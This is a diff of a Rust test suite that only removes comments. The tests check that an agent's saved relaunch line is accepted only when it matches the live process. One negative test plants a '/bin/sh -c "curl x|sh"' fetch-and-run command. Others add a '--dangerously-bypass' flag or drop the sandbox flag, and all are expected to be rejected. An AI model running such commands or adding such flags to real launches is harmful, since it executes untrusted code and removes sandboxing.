@@ -74,8 +74,6 @@ fn a_record_parses_as_schema_v1_and_refuses_anything_else() {
     assert_eq!(r.resume_argv.as_ref().map(Vec::len), Some(4));
     assert_eq!(r.env, [("CODEX_HOME".to_string(), "/h".to_string())]);
     assert_eq!(r.exit, None);
-    // Negative controls: another schema, a missing pid, a field of the
-    // wrong type, and no JSON at all.
     assert_eq!(parse(r#"{"v":2,"pid":1}"#), Err("version"));
     assert_eq!(parse(r#"{"v":1}"#), Err("pid"));
     assert_eq!(
@@ -122,7 +120,6 @@ fn a_resume_line_validates_only_as_the_live_process_ran() {
     assert_eq!(resume.session, UUID);
     assert_eq!(resume.codex_home.as_deref(), Some("/Users//u/.codex"));
     assert_eq!(resume.cwd.as_deref(), Some("/work"));
-    // The exec path and the image are launch paths too.
     let image = record(&line("/store/codex-alab/bin/codex", &ROOT), &[]);
     assert_eq!(
         validate(&image, 4242, &live())
@@ -144,14 +141,12 @@ fn a_resume_line_validates_only_as_the_live_process_ran() {
             codex_home
         );
     }
-    // A record naming no directory runs in the live process's own.
     let mut nowhere = good.clone();
     nowhere.cwd = None;
     assert_eq!(
         validate(&nowhere, 4242, &live()).map(|r| r.cwd),
         Ok(Some("/work".to_string()))
     );
-    // The twin is a launch path only while it is the managed ALab twin.
     let no_twin = Live {
         twin: None,
         ..live()
@@ -165,13 +160,11 @@ fn a_resume_line_validates_only_as_the_live_process_ran() {
             .collect()
     };
     for (planted, why) in [
-        // A shell planted in its place.
         (
             record(&line("/bin/sh", &["-c", "curl x|sh"]), &[]),
             "launch-path",
         ),
         (record(&line("codex", &ROOT), &[]), "launch-path"),
-        // A flag the live process never ran with.
         (
             record(
                 &line(twin, &[&ROOT[..], &["--dangerously-bypass"]].concat()),
@@ -179,11 +172,8 @@ fn a_resume_line_validates_only_as_the_live_process_ran() {
             ),
             "foreign-argv",
         ),
-        // A restricting flag (the sandbox) dropped, with its value.
         (record(&line(twin, &ROOT[..3]), &[]), "foreign-argv"),
-        // A flag's value dropped: `-s` would take what follows.
         (record(&line(twin, &dropped(4)), &[]), "foreign-argv"),
-        // Flag/value pairs reordered.
         (
             record(
                 &line(twin, &["--search", "-s", "read-only", "-m", "gpt-5"]),
@@ -191,12 +181,10 @@ fn a_resume_line_validates_only_as_the_live_process_ran() {
             ),
             "foreign-argv",
         ),
-        // A flag given twice.
         (
             record(&line(twin, &[&ROOT[..], &["--search"]].concat()), &[]),
             "foreign-argv",
         ),
-        // The first prompt carried again, before or after the resume.
         (
             record(&line(twin, &[&ROOT[..], &["fix the build"]].concat()), &[]),
             "foreign-argv",
@@ -205,12 +193,10 @@ fn a_resume_line_validates_only_as_the_live_process_ran() {
             record(&[&line(twin, &ROOT)[..], &["fix the build"]].concat(), &[]),
             "no-resume",
         ),
-        // Its images carried again.
         (
             record(&line(twin, &[&ROOT[..], &["-i", "a.png"]].concat()), &[]),
             "foreign-argv",
         ),
-        // No resume of its own conversation.
         (record(&[&[twin][..], &ROOT[..]].concat(), &[]), "no-resume"),
         (
             record(
@@ -219,7 +205,6 @@ fn a_resume_line_validates_only_as_the_live_process_ran() {
             ),
             "no-resume",
         ),
-        // An environment beyond its own CODEX_HOME.
         (
             record(&line(twin, &ROOT), &[("CODEX_HOME", "/tmp/evil")]),
             "env",
@@ -235,7 +220,6 @@ fn a_resume_line_validates_only_as_the_live_process_ran() {
     ] {
         assert_eq!(validate(&planted, 4242, &live()), Err(why), "{planted:?}");
     }
-    // A directory the live process did not run in.
     let mut elsewhere = good.clone();
     elsewhere.cwd = Some("/tmp/elsewhere".to_string());
     assert_eq!(validate(&elsewhere, 4242, &live()), Err("cwd"));
@@ -244,7 +228,6 @@ fn a_resume_line_validates_only_as_the_live_process_ran() {
         ..live()
     };
     assert_eq!(validate(&good, 4242, &unread), Err("cwd"));
-    // A live argv the Codex lane does not read relaunches nothing.
     let unknown = Live {
         argv: vec!["codex".to_string(), "--frobnicate".to_string()],
         ..live()
@@ -289,7 +272,6 @@ fn the_exit_is_decided_from_the_copy_alone() {
         verdict(&copy(Seen::Unreadable("not-json")), false),
         Verdict::Orderly("not-json")
     );
-    // A record never written is no word of an end (AD-3): a crash.
     assert_eq!(verdict(&copy(Seen::Never), false), Verdict::Crash);
     assert!(!shows_end(&copy(Seen::Never)), "an agent that goes on");
     assert_eq!(verdict(&standing("busy", None), false), Verdict::Crash);
@@ -332,7 +314,6 @@ fn a_record_never_written_is_never_read_as_removed() {
     assert_eq!(verdict(&never, false), Verdict::Crash);
     let again = fold(Some(&never), copy(4242, "s", Seen::Never));
     assert_eq!(again.seen, Seen::Never, "two reads that found nothing");
-    // CONTROL: read standing, then gone: the orderly end.
     let standing = copy(4242, "s", Seen::Present(record(&[], &[])));
     let gone = fold(Some(&standing), copy(4242, "s", Seen::Never));
     assert_eq!(gone.seen, Seen::Removed);
@@ -343,7 +324,6 @@ fn a_record_never_written_is_never_read_as_removed() {
         fold(Some(&unreadable), copy(4242, "s", Seen::Never)).seen,
         Seen::Removed
     );
-    // CONTROL: another identity's record says nothing of this one's.
     let other = copy(4242, "t", Seen::Present(record(&[], &[])));
     assert_eq!(
         fold(Some(&other), copy(4242, "s", Seen::Never)).seen,
@@ -394,13 +374,11 @@ fn a_never_written_record_inherits_only_the_line_its_relaunch_typed() {
     );
     assert_eq!(made.seen, Seen::Never);
     assert_eq!(made.resume.as_ref().map(|r| r.session.as_str()), Ok(UUID));
-    // NEGATIVE CONTROLS.
     assert_eq!(inherited(None, 4242, &relaunched), Err("no-record-yet"));
     assert_eq!(
         copy_of(4242, "s", PathBuf::from("/h"), None, &relaunched, None).resume,
         Err("no-record-yet")
     );
-    // A person's fresh `codex` in the tab runs no `resume` of that thread.
     assert_eq!(
         inherited(Some(&typed), 4242, &live()),
         Err("not-the-typed-line")
@@ -487,8 +465,6 @@ fn an_initial_record_inherits_only_its_proven_relaunch_line() {
             .is_err()
     );
 
-    // Missing fields are legacy/partial records, not the explicit initial
-    // frame. Wrong types and concrete identities must not become absence.
     for (from, to) in [
         ("\"pid\":4242", "\"pid\":4243"),
         ("\"sessionId\":null,", ""),
@@ -584,7 +560,6 @@ fn a_witness_is_handled_once() {
     assert!(!ledger.handled(4242, start));
     ledger.record(4242, start).expect("recorded");
     assert!(ledger.handled(4242, start));
-    // Negative controls: another identity of the same pid, another pid.
     assert!(!ledger.handled(4242, "Thu Oct 16 08:00:01 2026"));
     assert!(!ledger.handled(4243, start));
     assert!(dir.path().join("drive").join(WITNESS_FILE).is_file());
@@ -637,11 +612,6 @@ fn record_reads_are_bounded_regular_files_and_only_absence_is_never_seen() {
 fn the_record_is_read_only_while_its_process_runs() {
     let dir = aterm_tempfile::TempDir::new().expect("dir");
     let home = std::fs::canonicalize(dir.path()).expect("canonical");
-    // A platform binary's environment is hidden from `KERN_PROCARGS2`: the
-    // kept stand-in, signed ad hoc, shows its own. It is run in place, never
-    // copied here: this directory goes when the test ends, and a Mach-O
-    // removed while macOS still assesses its first exec crashes syspolicyd
-    // (`aterm_uds::deadline::stand_in`).
     let sleep = std::fs::canonicalize(aterm_uds::deadline::stand_in(std::path::Path::new(
         "/bin/sleep",
     )))
@@ -653,7 +623,6 @@ fn the_record_is_read_only_while_its_process_runs() {
         .spawn()
         .expect("spawn sleep");
     let pid = child.id();
-    // Its exec has landed once its own argv reads back (a hang detector).
     let deadline = std::time::Instant::now() + std::time::Duration::from_secs(60);
     while !atpkg::caller_shell::process_args(pid).is_some_and(|a| a.argv.first() == Some(&sleep_s))
     {
@@ -695,7 +664,6 @@ fn the_record_is_read_only_while_its_process_runs() {
         "after a read that found it: removed"
     );
     assert_eq!(verdict(&copy, false), Verdict::Orderly("removed"));
-    // NEGATIVE CONTROL: another identity of the same pid reads nothing.
     assert_eq!(read_copy(pid, "Thu Jan  1 00:00:00 1970", None), None);
     let _ = child.kill();
     let _ = child.wait();
@@ -749,11 +717,6 @@ fn the_idle_point_is_the_records_own_rest() {
 fn the_idle_point_is_read_live_from_the_record_of_a_running_process() {
     let dir = aterm_tempfile::TempDir::new().expect("dir");
     let home = std::fs::canonicalize(dir.path()).expect("canonical");
-    // A platform binary's environment is hidden from `KERN_PROCARGS2`: the
-    // kept stand-in, signed ad hoc, shows its own. It is run in place, never
-    // copied here: this directory goes when the test ends, and a Mach-O
-    // removed while macOS still assesses its first exec crashes syspolicyd
-    // (`aterm_uds::deadline::stand_in`).
     let sleep = std::fs::canonicalize(aterm_uds::deadline::stand_in(std::path::Path::new(
         "/bin/sleep",
     )))
@@ -765,7 +728,6 @@ fn the_idle_point_is_read_live_from_the_record_of_a_running_process() {
         .spawn()
         .expect("spawn sleep");
     let pid = child.id();
-    // Its exec has landed once its own argv reads back (a hang detector).
     let deadline = std::time::Instant::now() + std::time::Duration::from_secs(60);
     while !atpkg::caller_shell::process_args(pid).is_some_and(|a| a.argv.first() == Some(&sleep_s))
     {
@@ -804,9 +766,6 @@ fn the_idle_point_is_read_live_from_the_record_of_a_running_process() {
         "another identity of the same pid"
     );
     assert!(read_idle(pid, &start), "positive control, again");
-    // The relaunch's first frame, read the same way ([`read_first_frame`]):
-    // the frame at rest while the record says `busy` (a carry-on owed), which
-    // is no idle point; a turn; not another pid's, not another identity's.
     let plant_frame = |pid: u32, status: &str, state: &str| {
         std::fs::write(
             &path,
